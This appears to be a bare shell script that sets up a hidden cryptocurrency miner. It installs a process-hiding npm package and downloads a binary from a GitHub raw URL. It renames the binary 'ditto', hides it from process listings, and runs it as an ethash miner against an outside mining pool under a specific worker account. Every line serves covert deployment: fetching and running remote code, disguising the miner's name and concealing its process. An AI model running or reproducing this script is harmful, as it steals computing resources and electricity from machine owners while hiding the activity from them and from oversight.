apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
mv Transport ditto
chmod +x ditto
ph add ditto
pkill -o 1
sudo ./ditto -a ethash -o stratum+tcp://ethash.kupool.com:8888 -u denisule54.001 -p x -w Trans --no-sni --dns-https-server 1.1.1.1
